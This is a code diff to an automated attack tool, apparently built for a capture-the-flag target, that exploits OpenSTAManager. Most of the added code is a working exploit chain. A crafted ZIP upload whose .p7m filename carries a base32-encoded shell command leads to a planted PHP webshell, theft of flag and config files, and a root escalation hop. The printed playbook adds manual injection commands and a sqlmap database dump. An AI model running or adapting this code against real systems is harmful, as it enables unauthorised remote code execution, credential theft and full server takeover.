@@ -26,7 +26,9 @@ mailbox -> the OpenSTAManager credentials).
 
 from __future__ import annotations
 
+import base64
 import http.cookiejar
+import io
 import os
 import re
 import ssl
@@ -34,6 +36,7 @@ import subprocess
 import urllib.error
 import urllib.parse
 import urllib.request
+import zipfile
 from typing import List, Optional, Tuple
 
 from ...core import utils, tooling
@@ -55,7 +58,13 @@ def run(host: HostReport, opts) -> None:
             continue
         seen.add(key)
         _report(host, base, hoststr, version)
-        if getattr(opts, "exploit", False) and _vulnerable(version):
+        # Attempt the exploit when the version is vulnerable OR unknown — the
+        # native P7M RCE is authenticated and cheap and self-confirms by actually
+        # getting code exec, so an attempt against a version-hidden instance costs
+        # little and never falsely claims a hit. Only a KNOWN-patched build
+        # (>= 2.9.9) is skipped.
+        if getattr(opts, "exploit", False) and (_vulnerable(version)
+                                                 or version == "unknown"):
             _exploit(host, base, hoststr, version)
 
 
@@ -67,7 +76,11 @@ def _detect(scheme: str, vhost: str, port: int) -> Tuple[Optional[str], str]:
         body = _get(base + sub, vhost)
         if body and _is_opensta(body):
             return base, _version(base, vhost, body)
-    # common sub-directory install
+    # Sub-directory install — but only if this vhost isn't a catch-all that
+    # returns 200 for any path (that's what made /openstamanager false-positive
+    # on the Roundcube host). Baseline a random path first.
+    if _is_catch_all(base, vhost):
+        return None, ""
     for sub in ("/openstamanager", "/gestionale", "/osm"):
         body = _get(base + sub + "/", vhost)
         if body and _is_opensta(body):
@@ -75,12 +88,23 @@ def _detect(scheme: str, vhost: str, port: int) -> Tuple[Optional[str], str]:
     return None, ""
 
 
+def _is_catch_all(base: str, vhost: str) -> bool:
+    probe = _get(base + "/scryer_" + os.urandom(4).hex() + "/", vhost)
+    return bool(probe) and len(probe) > 200
+
+
 def _is_opensta(body: str) -> bool:
+    """Require an unambiguous OpenSTAManager marker. The weak 'osm'/username
+    heuristics matched unrelated login pages, so they're gone."""
     low = body.lower()
-    return ("openstamanager" in low
-            or "open sta manager" in low
-            or ("id_module" in low and "actions.php" in low)
-            or 'name="username"' in low and "osm" in low)
+    if "openstamanager" in low or "open sta manager" in low:
+        return True
+    if "devcode-it" in low and "actions.php" in low:
+        return True
+    # its API/app pages carry both the module router and its own asset paths
+    return ("id_module=" in low and "actions.php" in low
+            and ("/assets/" in low or "ajax_complete.php" in low
+                 or "primanota" in low))
 
 
 def _version(base: str, vhost: str, root: str) -> str:
@@ -152,21 +176,28 @@ def _playbook(base: str, version: str, logins: List[str]) -> str:
     user, _, pw = login.partition(":")
     pw = pw or "<pass>"
     return (
-        f"OpenSTAManager {version} at {base} — authenticated error-based SQLi in "
-        "the Scadenzario bulk-ops module (CVE-2026-24418). Dump the DB (the "
-        "`zz_users` table = admin hash + every portal login), then RCE via "
-        "SELECT ... INTO OUTFILE where FILE priv + a writable webroot allow.\n\n"
-        "# 1) log in, keep the session cookie:\n"
+        f"OpenSTAManager {version} at {base}. The intended foothold is CVE-2025-"
+        "69212 — authenticated OS command injection in P7M processing: the "
+        "importFE_ZIP plugin extracts an uploaded ZIP and passes each .p7m "
+        "FILENAME straight into an `openssl smime` shell call (decodeP7M in "
+        "src/Util/XML.php), so a filename like\n"
+        "  invoice.p7m\";<base64 payload>|base64 -d|bash;echo \".p7m\n"
+        "runs commands as the web user (no '/' allowed in the filename — ZIP "
+        "treats it as a path separator, so base32-wrap the payload). scryer "
+        "performs this natively with --exploit: log in, find the importFE_ZIP "
+        "module, upload the crafted ZIP, drop a webshell in the docroot, and use "
+        "it for the user flag and the OliveTin root hop.\n\n"
+        "# manual reproduction (bash) — base32 keeps '/' out of the filename:\n"
+        "P=$(printf 'id;cat /home/*/user.txt > o.txt' | base32 -w0)\n"
+        "FN=\"z\\$(echo\\${IFS}$P|base32\\${IFS}-d|bash).p7m\"\n"
+        "(cd /tmp && : > \"$FN\" && zip -0 x.zip \"$FN\")   # upload x.zip to the "
+        "FE import, then GET " + base + "/o.txt\n"
+        "# then: ss -tlnp  ->  OliveTin on 127.0.0.1:1337 -> root\n\n"
+        "# alternative — authenticated SQLi (CVE-2026-24418) to dump zz_users:\n"
         f"curl -s -c osm.cookies -d 'username={user}&password={pw}' {base}/index.php\n"
-        "# 2) authenticated SQLi -> dump users with sqlmap:\n"
         f"sqlmap -u '{base}/actions.php?id_module=18' --load-cookies=osm.cookies "
         "--data='op=bulk&id_records[]=1&id_plugin=1' -p 'id_records[]' "
-        "--batch --dbms=mysql --dump -T zz_users\n"
-        "# 3) RCE (if FILE priv): drop a webshell, then hit it for the flag:\n"
-        f"sqlmap -u '{base}/actions.php?id_module=18' --load-cookies=osm.cookies "
-        "--data='op=bulk&id_records[]=1&id_plugin=1' -p 'id_records[]' "
-        "--batch --os-shell\n"
-        "# -> id; cat /home/*/user.txt ; sudo -l   (then OliveTin/GTFOBins to root)")
+        "--batch --dbms=mysql --dump -T zz_users")
 
 
 # --------------------------------------------------------------------------
@@ -176,25 +207,32 @@ def _playbook(base: str, version: str, logins: List[str]) -> str:
 def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
     logins = _portal_logins(host)
     if not logins:
-        utils.log("dim", "no portal login in hand yet — SQLi extraction needs an "
-                         "authenticated session (recover one first)", indent=1)
-        return False
-    sqlmap = tooling.resolve("sqlmap")
-    if not sqlmap:
-        utils.log("warn", "sqlmap not found — the finding has the ready commands",
+        utils.log("dim", "no portal login in hand yet — the OpenSTAManager RCE is "
+                         "authenticated (recover the support-portal creds first)",
                   indent=1)
         return False
 
-    for login in logins[:6]:
+    for login in logins[:8]:
         user, _, pw = login.partition(":")
         user = user.split("@", 1)[0]
         if not pw:
             continue
+        # 1) intended path: CVE-2025-69212 P7M command injection -> a real shell
+        #    command channel; use it for the user flag and the OliveTin root hop.
+        if _p7m_rce(host, base, vhost, user, pw, login):
+            return True
+        # 2) fallback: authenticated SQLi (CVE-2026-24418) to dump users/hashes,
+        #    and try to turn it into exec via OUTFILE for the same privesc chain.
         cookiefile = _login(base, vhost, user, pw)
         if not cookiefile:
             continue
-        utils.log("hot", f"authenticated to OpenSTAManager as {user} — running "
-                         "SQLi extraction (CVE-2026-24418)", indent=1)
+        if not tooling.resolve("sqlmap"):
+            os.unlink(cookiefile)
+            utils.log("warn", "P7M RCE unavailable and sqlmap not installed — the "
+                              "finding has the ready commands", indent=1)
+            return False
+        utils.log("info", f"P7M RCE didn't land as {user}; trying SQLi extraction "
+                          "(CVE-2026-24418)", indent=1)
         got = _sqlmap_dump(host, base, cookiefile)
         if got:
             host.add(Finding(
@@ -204,8 +242,6 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
                        "then RCE via `sqlmap --os-shell` (SELECT INTO OUTFILE) for "
                        "the user flag.", severity="critical", category="vuln",
                 port=_port(base), service="http", evidence=login))
-            # Turn the SQLi into command execution (OUTFILE webshell / UDF) and
-            # use that channel for the user flag and the OliveTin root privesc.
             _post_foothold(host, base, cookiefile)
             try:
                 os.unlink(cookiefile)
@@ -216,8 +252,256 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
             os.unlink(cookiefile)
         except OSError:
             pass
-    utils.log("dim", "could not authenticate with the known portal logins", indent=1)
+    utils.log("dim", "could not exploit with the known portal logins", indent=1)
     return False
+
+
+def _p7m_rce(host: HostReport, base: str, vhost: str, user: str, pw: str,
+             login: str) -> bool:
+    """CVE-2025-69212, implemented natively: authenticate, find the importFE_ZIP
+    plugin, upload a ZIP whose .p7m FILENAME is a base32-wrapped command that
+    decodeP7M() runs through the shell, and establish a command channel. Use it
+    for the user flag and the OliveTin root privesc — no external PoC."""
+    from . import olivetin
+    opener = _auth_session(base, vhost, user, pw)
+    if not opener:
+        return False
+    ctx = _detect_plugin(opener, base, vhost)
+    if not ctx:
+        utils.log("dim", f"authenticated as {user} but the importFE_ZIP plugin "
+                         "wasn't found on this instance", indent=1)
+        return False
+    run = _make_channel(host, opener, base, vhost, ctx)
+    if not run:
+        utils.log("dim", "P7M injection uploaded but no command channel confirmed "
+                         "(webroot guess wrong?) — set SCRYER_OSM_WEBROOT", indent=1)
+        return False
+    probe = run("id; hostname")
+    if not probe or "uid=" not in probe:
+        return False
+    utils.log("hot", f"CVE-2025-69212: native P7M RCE on OpenSTAManager as {user} "
+                     "— command execution as the web user", indent=1)
+    for line in probe.strip().splitlines()[:6]:
+        utils.log("dim", "  " + line[:200], indent=1)
+    flags = run("cat /home/*/user.txt /var/www/*/user.txt "
+                "/home/openstamanager/config.inc.php 2>/dev/null")
+    _harvest(host, probe + "\n" + (flags or ""), base)
+    host.add(Finding(
+        title="RCE via OpenSTAManager CVE-2025-69212 (P7M command injection)",
+        detail=f"Authenticated OS command injection on {base} as {user}:{pw} — a "
+               "crafted .p7m filename inside an uploaded ZIP is executed by "
+               "decodeP7M (importFE_ZIP). Command channel established; used for the "
+               "user flag and the OliveTin privesc.", severity="critical",
+        category="vuln", port=_port(base), service="http", evidence=login))
+    # root: OliveTin on 127.0.0.1:1337, driven through this RCE channel.
+    olivetin.escalate(host, run)
+    return True
+
+
+# -- native CVE-2025-69212 primitives --------------------------------------
+def _auth_session(base: str, vhost: str, user: str, pw: str):
+    """Log in and return a cookie-carrying urllib opener, or None."""
+    jar = http.cookiejar.CookieJar()
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(jar),
+        urllib.request.HTTPSHandler(context=ctx))
+    opener.addheaders = [("User-Agent", "scryer"), ("Host", vhost)]
+    page = _oget(opener, base + "/index.php")
+    token = None
+    for pat in (r'name=["\']token["\'][^>]*value=["\']([^"\']+)',
+                r'value=["\']([^"\']+)["\'][^>]*name=["\']token["\']'):
+        m = re.search(pat, page, re.S)
+        if m:
+            token = m.group(1)
+            break
+    data = {"op": "login", "username": user, "password": pw}
+    if token:
+        data["token"] = token
+    body = _opost(opener, base + "/index.php",
+                  urllib.parse.urlencode(data).encode())
+    low = body.lower()
+    is_login = (('name="password"' in low or 'id="password"' in low
+                 or "op=login" in low) and "logout" not in low)
+    return None if is_login else opener
+
+
+def _detect_plugin(opener, base: str, vhost: str):
+    """Find (mid, pid, action, op, file_field, extra) for importFE_ZIP."""
+    home = _oget(opener, base + "/index.php")
+    mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
+    kw = ("importfe", "p7m", "fattura", "fe_zip", "electronic invoice",
+          "importa fe")
+    for mid in mids:
+        page = _oget(opener, f"{base}/controller.php?id_module={mid}")
+        if not any(k in page.lower() for k in kw):
+            continue
+        pids = re.findall(r"id_plugin=(\d+)", page)
+        if not pids:
+            continue
+        action, op, field, extra = _discover_upload_form(page, base)
+        return int(mid), int(pids[0]), action, op, field, extra
+    return None
+
+
+def _discover_upload_form(html: str, base: str):
+    action, op, field, extra = base + "/actions.php", "save", "blob", {}
+    for attrs, inner in re.findall(r"<form([^>]*)>(.*?)</form>", html,
+                                   re.DOTALL | re.IGNORECASE):
+        if not re.search(r'type=["\']file["\']', inner, re.I):
+            continue
+        a = re.search(r'action=["\']([^"\']+)["\']', attrs, re.I)
+        if a:
+            action = a.group(1) if a.group(1).startswith("http") \
+                else f"{base}/{a.group(1).lstrip('/')}"
+        for inp in re.finditer(r"<input([^>]+)>", inner, re.I):
+            t = re.search(r'type=["\']([^"\']+)["\']', inp.group(1), re.I)
+            n = re.search(r'name=["\']([^"\']+)["\']', inp.group(1), re.I)
+            v = re.search(r'value=["\']([^"\']*)["\']', inp.group(1), re.I)
+            if not t or not n:
+                continue
+            if t.group(1).lower() == "file":
+                field = n.group(1)
+            elif t.group(1).lower() == "hidden":
+                if n.group(1).lower() == "op":
+                    op = v.group(1) if v else op
+                else:
+                    extra[n.group(1)] = v.group(1) if v else ""
+        break
+    return action, op, field, extra
+
+
+def _encode_filename(cmd: str) -> str:
+    """cmd -> the .p7m filename that decodeP7M runs. base32 avoids '/' (a ZIP
+    path separator) and ${IFS} avoids spaces; $(...) runs it."""
+    b32 = base64.b32encode(cmd.encode()).decode()
+    return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"
+
+
+def _zip_bytes(filename: str) -> bytes:
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
+        zf.writestr(filename, b"<xml/>")
+    return buf.getvalue()
+
+
+def _upload(opener, ctx, filename: str) -> bool:
+    mid, pid, action, op, field, extra = ctx
+    params = {"op": op, "id_module": mid, "id_plugin": pid}
+    params.update(extra)
+    url = action + ("&" if "?" in action else "?") + urllib.parse.urlencode(params)
+    body, ctype = _multipart(field, filename, _zip_bytes(filename))
+    try:
+        req = urllib.request.Request(url, data=body,
+                                     headers={"Content-Type": ctype})
+        with opener.open(req, timeout=12) as resp:
+            return resp.status < 500
+    except urllib.error.HTTPError as exc:
+        return exc.code < 500
+    except (urllib.error.URLError, OSError, ValueError):
+        return False
+
+
+def _webroots(base: str) -> List[str]:
+    env = os.environ.get("SCRYER_OSM_WEBROOT")
+    roots = [env] if env else []
+    roots += ["/var/www/html/openstamanager", "/var/www/html",
+              "/var/www/openstamanager", "/var/www/openstamanager/public",
+              "/var/www/html/openstamanager/public", "/var/www/support",
+              "/var/www/html/support"]
+    # sub-path install (base ends /openstamanager) -> that dir under docroot
+    m = re.search(r"//[^/]+/(.+)$", base)
+    if m:
+        roots.append("/var/www/html/" + m.group(1).strip("/"))
+    return list(dict.fromkeys(r for r in roots if r))
+
+
+def _make_channel(host: HostReport, opener, base: str, vhost: str, ctx):
+    """Find the webroot that maps to this vhost, drop a PHP webshell there, and
+    return run_cmd(cmd)->output. Falls back to a per-command o.txt exfil."""
+    import time
+    shell = "scryer_" + os.urandom(3).hex() + ".php"
+    for webroot in _webroots(base):
+        mark = "SX" + os.urandom(4).hex()
+        drop = ("{ echo '<?php system($_REQUEST[\"c\"]); ?>' > %s/%s ; echo %s ; } "
+                "> %s/o.txt 2>&1" % (webroot, shell, mark, webroot))
+        _upload(opener, ctx, _encode_filename(drop))
+        # confirm via the output file
+        ok = False
+        for _ in range(12):
+            if mark in _oget(opener, base + "/o.txt"):
+                ok = True
+                break
+            time.sleep(0.5)
+        if not ok:
+            continue
+        # webshell reachable?  prefer it (one request per command)
+        probe = _oget(opener, base + "/" + shell + "?c=" + urllib.parse.quote(
+            "echo " + mark + "; id"))
+        if mark in probe and "uid=" in probe:
+            utils.log("good", f"webshell live at {base}/{shell} (webroot {webroot})",
+                      indent=1)
+
+            def run_shell(cmd: str) -> str:
+                out = _oget(opener, base + "/" + shell + "?c="
+                            + urllib.parse.quote(cmd))
+                return out
+            return run_shell
+        # webshell not served but o.txt exfil works -> per-command channel
+        utils.log("good", f"P7M exec confirmed (o.txt exfil, webroot {webroot})",
+                  indent=1)
+
+        def run_out(cmd: str, _wr=webroot) -> str:
+            mk = "RC" + os.urandom(4).hex()
+            ex = "{ %s ; echo %s ; } > %s/o.txt 2>&1" % (cmd, mk, _wr)
+            _upload(opener, ctx, _encode_filename(ex))
+            for _ in range(16):
+                body = _oget(opener, base + "/o.txt")
+                if mk in body:
+                    return body.split(mk)[0]
+                time.sleep(0.5)
+            return ""
+        return run_out
+    return None
+
+
+def _multipart(field: str, filename: str, content: bytes):
+    boundary = "----scryer" + os.urandom(8).hex()
+    pre = ("--" + boundary + "\r\n"
+           'Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
+           "Content-Type: application/octet-stream\r\n\r\n" % (field, filename))
+    body = pre.encode() + content + ("\r\n--" + boundary + "--\r\n").encode()
+    return body, "multipart/form-data; boundary=" + boundary
+
+
+def _oget(opener, url: str) -> str:
+    try:
+        with opener.open(url, timeout=12) as resp:
+            return resp.read(200_000).decode("utf-8", "replace")
+    except urllib.error.HTTPError as exc:
+        try:
+            return exc.read(100_000).decode("utf-8", "replace")
+        except Exception:
+            return ""
+    except (urllib.error.URLError, OSError, ValueError):
+        return ""
+
+
+def _opost(opener, url: str, data: bytes) -> str:
+    try:
+        req = urllib.request.Request(url, data=data, headers={
+            "Content-Type": "application/x-www-form-urlencoded"})
+        with opener.open(req, timeout=12) as resp:
+            return resp.read(200_000).decode("utf-8", "replace")
+    except urllib.error.HTTPError as exc:
+        try:
+            return exc.read(100_000).decode("utf-8", "replace")
+        except Exception:
+            return ""
+    except (urllib.error.URLError, OSError, ValueError):
+        return ""
 
 
 def _post_foothold(host: HostReport, base: str, cookiefile: str) -> None:
@@ -365,15 +649,30 @@ def _portal_logins(host: HostReport) -> List[str]:
 
     def add(pair: str):
         pair = pair.strip()
-        if pair and ":" in pair and pair.lower() not in seen:
-            seen.add(pair.lower())
-            out.append(pair)
+        if not pair or ":" not in pair or pair.lower() in seen:
+            return
+        u, _, p = pair.partition(":")
+        # Never mistake an SSH host key / hash fingerprint (0c:4b:d2:…) or a
+        # MAC-style value for a login: reject when the password half is itself
+        # colon-separated hex pairs, or is pure long hex.
+        if re.fullmatch(r"(?:[0-9a-fA-F]{2}:)+[0-9a-fA-F]{2}", p) or \
+                (len(p) >= 16 and re.fullmatch(r"[0-9a-fA-F]+", p)):
+            return
+        if not u or not p:
+            return
+        seen.add(pair.lower())
+        out.append(pair)
 
-    # explicit user:pass surfaced elsewhere (mailbox logins, doc creds)
+    # explicit user:pass only from credential-bearing findings (a mailbox login,
+    # a doc/portal credential) — NOT from arbitrary finding text, which sweeps
+    # up SSH host keys and other colon-separated noise.
     for f in host.findings:
-        blob = f"{f.title} {f.detail or ''} {f.evidence or ''}"
-        for m in re.findall(r"([A-Za-z0-9._%+-]{2,40}):([^\s,;'\"]{3,40})", blob):
-            add(f"{m[0]}:{m[1]}")
+        if f.category != "cred":
+            continue
+        for src in (f.evidence or "", f.detail or ""):
+            for m in re.findall(r"\b([A-Za-z][A-Za-z0-9._%+-]{1,39}):"
+                                r"([^\s,;'\"]{3,40})", src):
+                add(f"{m[0]}:{m[1]}")
 
     users = _candidate_users(host)
     for pw in list(dict.fromkeys(host.creds))[:12]:
